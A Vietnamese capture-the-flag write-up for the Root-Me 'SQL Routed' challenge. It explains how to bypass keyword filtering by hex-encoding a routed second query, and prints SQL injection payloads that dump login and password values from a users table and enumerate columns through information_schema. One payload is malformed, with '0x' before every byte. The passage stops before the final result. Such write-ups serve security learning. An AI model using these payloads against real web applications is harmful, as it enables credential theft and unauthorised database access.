# Rootme.SQL-Routed

Point: 35

Exploit my requests

Statement: Find the password

Related resource: [Routed SQL Injection - Zenodermus Javanicus (Exploitation - Web)](https://securityidiots.com/Web-Pentest/SQL-Injection/routed_sql_injection.html)

# Overview

Form cảu challlenge như sau

![image](https://user-images.githubusercontent.com/115911041/232952854-5b94276c-de72-41b4-8842-c8bbeec403a1.png)

Challenge lần này cung cấp cho ta một web có chứng năng login và search. Vậy ta cần phải tìm password để login vào administrator

# Solution

Sau một vài lần thử một số payload đơn giản ở `Home` thì không có gì nhiều xảy ra. Mình chuyển sang `Search` để tiếp tục, sau khi thừ chèn `'` thì đã có hi vọng

![image](https://user-images.githubusercontent.com/115911041/232953414-aec1b1fa-fed5-4ea2-8d1e-ee945fd49e9f.png)

Vậy là database đang sử dụng MariaDB. Mình tiếp tục thử các lệnh khác thì đều bị filter hết như `or`, `and`, `order by`.

Nếu các bạn có đọc tài liệu mà challenge đã cung cấp thì sẽ biết cách bypass SQL-Routed.Là chúng ta sẽ chuyển câu truy vấn sang dạng hex là xong.

``` 
#Hex of: -1' union select login,password from users-- a
-1' union select 0x2d312720756e696f6e2073656c656374206c6f67696e2c70617373776f72642066726f6d2075736572732d2d2061 -- a
```

Nếu các bạn muốn nhanh thì có thể sử dụng payload đó vào phần search là sẽ ra flag. Nhưng mình sẽ tiếp tục sử dụng cách khác để có thể hiểu bài hơn.Như anh Khánh đã từng nói:"Làm được python tồi hãy nghĩ đến sử dụng tool".

Bước đầu, mình sử dụng query này:
`' UNION SELECT 1 -- -`

![image](https://user-images.githubusercontent.com/115911041/232954760-1d4d65e0-6176-4cb8-8019-751c1930ff06.png)

Vậy chứng tỏ là sau khi thực hiện câu lệnh union select 1, nó sẽ tiếp tục đi thực hiện một câu lệnh truy vấn khác nữa. Vì nếu chỉ có 1 câu lệnh thì nó sẽ trả về 1 thôi.

Bây giờ ta chỉ cần xác định số column, mình sẽ sử dụng `order by`

```
#Hex of: 'union select order by 1-- -
'union+select+0x276f7264657220627920312d2d202d--+ 
```
Sau đó tăng dần đến 3 thì báo lỗi ` Unknown column '3' in 'order clause'`, vậy số column là 2. Giờ ta sẽ xác định table hiện tại là gì, mình sử dụng group_concat để lấy toàn bộ table users

```
#Hex of: 'union select null,(select group_concat(column_name) from information_schema.columns where table_name='users')-- -
'union+select+0x270x750x6e0x690x6f0x6e0x200x730x650x6c0x650x630x740x200x6e0x750x6c0x6c0x2c0x280x730x650x6c0x650x630x740x200x670x720x6f0x750x700x5f0x630x6f0x6e0x630x610x740x280x630x6f0x6c0x750x6d0x6e0x5f0x6e0x610x6d0x650x290x200x660x720x6f0x6d0x200x690x6e0x660x6f0x720x6d0x610x740x690x6f0x6e0x5f0x730x630x680x650x6d0x610x2e0x630x6f0x6c0x750x6d0x6e0x730x200x770x680x650x720x650x200x740x610x620x6c0x650x5f0x6e0x610x6d0x650x3d0x270x750x730x650x720x730x270x290x2d0x2d0x200x2d--+
```
Ta được phần response khá dài.

